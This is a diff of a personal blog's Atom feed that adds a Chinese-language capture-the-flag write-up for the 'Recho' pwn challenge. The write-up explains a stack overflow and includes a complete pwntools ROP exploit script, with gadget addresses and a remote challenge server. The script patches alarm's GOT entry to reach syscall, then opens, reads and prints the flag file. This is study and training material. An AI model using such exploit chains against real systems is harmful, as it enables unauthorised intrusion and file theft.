@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://czh11.github.io</id>
     <title>Nono</title>
-    <updated>2020-11-19T14:25:47.745Z</updated>
+    <updated>2020-11-28T06:43:59.580Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://czh11.github.io"/>
     <link rel="self" href="https://czh11.github.io/atom.xml"/>
@@ -10,6 +10,51 @@
     <logo>https://czh11.github.io/images/avatar.png</logo>
     <icon>https://czh11.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Nono</rights>
+    <entry>
+        <title type="html"><![CDATA[pwntools中判断输入是否结束]]></title>
+        <id>https://czh11.github.io/post/pwntools-zhong-pan-duan-shu-ru-shi-fou-jie-shu/</id>
+        <link href="https://czh11.github.io/post/pwntools-zhong-pan-duan-shu-ru-shi-fou-jie-shu/">
+        </link>
+        <updated>2020-11-28T06:36:16.000Z</updated>
+        <content type="html"><![CDATA[<p>攻防世界-Recho</p>
+<p>这题很容易发现是栈溢出，但是如何从while循环中退出来，困扰了很长时间，看来wp才发现pwntools中有一个io.shutdown('send')，帮助输入结束，然后就查看了一下字符串，发现有个flag，接下来就是如何从中读取出flag了，这里用open打开，用read读出，用printf打印出来，open的系统调用号是2，而且alarm是系统调用的函数，通过gdb调试找到syscall的偏移，然后就是构造payload了。</p>
+<figure data-type="image" tabindex="1"><img src="https://czh11.github.io/post-images/1606545634031.jpg" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://czh11.github.io/post-images/1606545642873.jpg" alt="" loading="lazy"></figure>
+<pre><code>#!/usr/bin/env python2
+#-*-coding:utf-8 -*
+from pwn import *
+context.log_level='debug'
+r=process(&quot;./Recho&quot;)
+r=remote(&quot;220.249.52.133&quot;,38037)
+elf=ELF(&quot;./Recho&quot;)
+write_plt=elf.plt['write']
+read_plt=elf.plt['read']
+alarm_plt=elf.plt['alarm']
+alarm_got=elf.got['alarm']
+printf_plt=elf.plt['printf']
+pop_rdi=0x00000000004008a3
+pop_rsi=0x00000000004008a1
+pop_rdx=0x00000000004006fe
+pop_rax=0x00000000004006fc
+add_rdi_al=0x000000000040070d
+flag=0x0601058
+bss=0x0601090
+payload='a'*0x38
+payload+=p64(pop_rdi)+p64(alarm_got)+p64(pop_rax)+p64(0x5)+p64(add_rdi_al)
+payload+=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(0x2)+p64(alarm_plt)
+payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x500)+p64(0)+p64(pop_rdx)+p64(0x50)+p64(read_plt)
+payload+=p64(pop_rdi)+p64(bss+0x500)+p64(printf_plt)
+r.recvuntil(&quot;Welcome to Recho server!&quot;)
+r.sendline(str(0x200))
+payload=payload.ljust(0x200,'\x00')
+r.sendline(payload)
+r.recv()
+r.shutdown('send')
+r.interactive()
+r.close
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[ctfpwn 一道数组越界的堆题]]></title>
         <id>https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/</id>
